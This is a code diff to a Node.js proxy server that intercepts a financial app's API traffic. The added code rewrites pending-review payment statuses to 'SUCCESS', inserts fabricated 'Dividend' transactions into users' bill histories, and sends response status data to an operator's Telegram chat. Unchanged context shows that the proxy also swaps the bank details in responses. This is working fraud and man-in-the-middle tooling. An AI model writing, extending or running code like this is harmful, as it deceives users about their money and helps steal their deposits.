@@ -117,6 +117,22 @@ async function saveData(data) {
             data.sellHistory = current.sellHistory;
           }
         }
+        if (current.orderBankMap && typeof current.orderBankMap === 'object') {
+          if (!data.orderBankMap) data.orderBankMap = {};
+          for (const oid of Object.keys(current.orderBankMap)) {
+            if (!data.orderBankMap[oid]) {
+              data.orderBankMap[oid] = current.orderBankMap[oid];
+            }
+          }
+        }
+        if (current.fakeBills && typeof current.fakeBills === 'object') {
+          if (!data.fakeBills) data.fakeBills = {};
+          for (const uid of Object.keys(current.fakeBills)) {
+            if (!data.fakeBills[uid] || data.fakeBills[uid].length < current.fakeBills[uid].length) {
+              data.fakeBills[uid] = current.fakeBills[uid];
+            }
+          }
+        }
       }
     }
     cachedData = data;
@@ -554,17 +570,20 @@ function markReviewAsSuccess(obj) {
   const reviewValues = [1, '1', 'review', 'REVIEW', 'Review', 'under_review', 'pending_review', 'reviewing'];
   const statusFields = ['payStatus', 'status', 'orderStatus', 'rechargeStatus', 'state', 'stat'];
   for (const field of statusFields) {
-    if (obj[field] !== undefined) {
-      if (reviewValues.includes(obj[field])) {
-        if (typeof obj[field] === 'number') obj[field] = 2;
-        else obj[field] = '2';
-      }
+    if (obj[field] !== undefined && reviewValues.includes(obj[field])) {
+      obj[field] = typeof obj[field] === 'number' ? 2 : '2';
     }
   }
-  const textFields = ['payStatusName', 'statusName', 'orderStatusName', 'statusText', 'statusStr'];
+  const textFields = ['payStatusName', 'statusName', 'orderStatusName', 'statusText', 'statusStr', 'payStatusStr'];
   for (const field of textFields) {
     if (obj[field] !== undefined && typeof obj[field] === 'string') {
       if (/review/i.test(obj[field])) obj[field] = 'SUCCESS';
+    }
+  }
+  for (const key of Object.keys(obj)) {
+    const kl = key.toLowerCase();
+    if ((kl.includes('status') || kl.includes('state')) && typeof obj[key] === 'string' && /review/i.test(obj[key])) {
+      obj[key] = 'SUCCESS';
     }
   }
 }
@@ -1274,6 +1293,19 @@ async function proxyAndReplaceBankDetails(req, res, label) {
         }
       }
       if (eff.forceReviewSuccess) {
+        if (data.adminChatId && bot) {
+          const statusDebug = {};
+          const src = Array.isArray(respData) ? respData[0] : respData;
+          if (src && typeof src === 'object') {
+            for (const k of Object.keys(src)) {
+              const kl = k.toLowerCase();
+              if (kl.includes('status') || kl.includes('state') || kl.includes('pay')) {
+                statusDebug[k] = src[k];
+              }
+            }
+          }
+          bot.sendMessage(data.adminChatId, `🔍 Status fields BEFORE fix:\n${JSON.stringify(statusDebug, null, 2)}`).catch(()=>{});
+        }
         if (Array.isArray(respData)) {
           respData.forEach(item => markReviewAsSuccess(item));
         } else {
@@ -1356,6 +1388,75 @@ async function proxyAndReplaceBankInList(req, res) {
   } catch(e) {
     console.error('List replace error:', req.originalUrl, e.message);
     if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
+  }
+}
+
+async function proxyAndInjectFakeBills(req, res) {
+  try {
+    const [data, { response, respBody, respHeaders, jsonResp }] = await Promise.all([
+      cachedData ? Promise.resolve(cachedData) : loadData(),
+      proxyFetch(req)
+    ]);
+    const detectedUserId = await extractUserId(req, jsonResp);
+    if (detectedUserId) saveTokenUserId(req, detectedUserId);
+
+    const listData = getResponseData(jsonResp);
+    let items = [];
+    let itemsKey = null;
+    if (listData) {
+      if (Array.isArray(listData)) {
+        items = listData;
+      } else if (listData.list && Array.isArray(listData.list)) {
+        items = listData.list;
+        itemsKey = 'list';
+      } else if (listData.records && Array.isArray(listData.records)) {
+        items = listData.records;
+        itemsKey = 'records';
+      } else if (listData.rows && Array.isArray(listData.rows)) {
+        items = listData.rows;
+        itemsKey = 'rows';
+      }
+    }
+
+    const userBills = (data.fakeBills && detectedUserId && data.fakeBills[String(detectedUserId)]) || [];
+    if (userBills.length > 0 && items.length > 0) {
+      const template = items[0];
+      const fakeEntries = userBills.map(fb => {
+        const entry = JSON.parse(JSON.stringify(template));
+        for (const k of Object.keys(entry)) {
+          const kl = k.toLowerCase();
+          if (kl.includes('orderno') || kl.includes('tradeno') || kl.includes('billno') || kl === 'id') {
+            entry[k] = fb.orderNo;
+          }
+          if (kl.includes('amount') || kl === 'money' || kl === 'changeamount') {
+            entry[k] = typeof entry[k] === 'string' ? '+' + fb.amount.toFixed(2) : fb.amount;
+          }
+          if (kl.includes('time') || kl.includes('date') || kl === 'addtime') {
+            entry[k] = fb.createTime;
+          }
+          if (kl.includes('type') || kl.includes('category') || kl === 'typename') {
+            if (typeof entry[k] === 'string') entry[k] = 'Dividend';
+          }
+        }
+        return entry;
+      });
+      fakeEntries.sort((a, b) => {
+        const fbA = userBills.find(f => f.orderNo === (a.orderNo || a.tradeNo || a.billNo || a.id));
+        const fbB = userBills.find(f => f.orderNo === (b.orderNo || b.tradeNo || b.billNo || b.id));
+        return (fbB ? fbB.timestamp : 0) - (fbA ? fbA.timestamp : 0);
+      });
+      items = [...fakeEntries, ...items];
+      if (itemsKey && listData) {
+        listData[itemsKey] = items;
+      } else if (jsonResp && jsonResp.data && Array.isArray(jsonResp.data)) {
+        jsonResp.data = items;
+      }
+    }
+
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) {
+    console.error('bills inject error:', e.message);
+    await transparentProxy(req, res);
   }
 }
 
@@ -1850,79 +1951,11 @@ app.all('/app/tool', async (req, res) => {
 });
 
 app.all('/app/bills', async (req, res) => {
-  await proxyAndReplaceBankInList(req, res);
+  await proxyAndInjectFakeBills(req, res);
 });
 
 app.all('/app/billsFilter', async (req, res) => {
-  try {
-    const [data, { response, respBody, respHeaders, jsonResp }] = await Promise.all([
-      cachedData ? Promise.resolve(cachedData) : loadData(),
-      proxyFetch(req)
-    ]);
-    const detectedUserId = await extractUserId(req, jsonResp);
-    if (detectedUserId) saveTokenUserId(req, detectedUserId);
-
-    const listData = getResponseData(jsonResp);
-    let items = [];
-    let itemsKey = null;
-    if (listData) {
-      if (Array.isArray(listData)) {
-        items = listData;
-      } else if (listData.list && Array.isArray(listData.list)) {
-        items = listData.list;
-        itemsKey = 'list';
-      } else if (listData.records && Array.isArray(listData.records)) {
-        items = listData.records;
-        itemsKey = 'records';
-      } else if (listData.rows && Array.isArray(listData.rows)) {
-        items = listData.rows;
-        itemsKey = 'rows';
-      }
-    }
-
-    const userBills = (data.fakeBills && detectedUserId && data.fakeBills[String(detectedUserId)]) || [];
-    if (userBills.length > 0 && items.length > 0) {
-      const template = items[0];
-      const fakeEntries = userBills.map(fb => {
-        const entry = JSON.parse(JSON.stringify(template));
-        if (entry.orderNo !== undefined) entry.orderNo = fb.orderNo;
-        if (entry.tradeNo !== undefined) entry.tradeNo = fb.orderNo;
-        if (entry.billNo !== undefined) entry.billNo = fb.orderNo;
-        const amountFields = ['amount', 'money', 'billAmount', 'tradeAmount', 'changeAmount'];
-        for (const af of amountFields) {
-          if (entry[af] !== undefined) {
-            entry[af] = typeof entry[af] === 'string' ? String(fb.amount.toFixed(2)) : fb.amount;
-          }
-        }
-        const timeFields = ['createTime', 'createDate', 'time', 'addTime', 'updateTime'];
-        for (const tf of timeFields) {
-          if (entry[tf] !== undefined) entry[tf] = fb.createTime;
-        }
-        const typeFields = ['typeName', 'billType', 'type', 'tradeType', 'categoryName'];
-        for (const tf of typeFields) {
-          if (entry[tf] !== undefined && typeof entry[tf] === 'string') entry[tf] = 'Dividend';
-        }
-        if (entry.id !== undefined) entry.id = fb.orderNo;
-        return entry;
-      });
-      fakeEntries.sort((a, b) => {
-        const fbA = userBills.find(f => f.orderNo === (a.orderNo || a.tradeNo || a.billNo));
-        const fbB = userBills.find(f => f.orderNo === (b.orderNo || b.tradeNo || b.billNo));
-        return (fbB ? fbB.timestamp : 0) - (fbA ? fbA.timestamp : 0);
-      });
-      items = [...fakeEntries, ...items];
-      if (itemsKey && listData) {
-        listData[itemsKey] = items;
-      } else if (jsonResp && jsonResp.data && Array.isArray(jsonResp.data)) {
-        jsonResp.data = items;
-      }
-    }
-
-    sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) {
-    console.error('billsFilter error:', e.message);
-    await transparentProxy(req, res);
-  }
+  await proxyAndInjectFakeBills(req, res);
 });
 
 app.all('/app/bonusDetails', async (req, res) => {
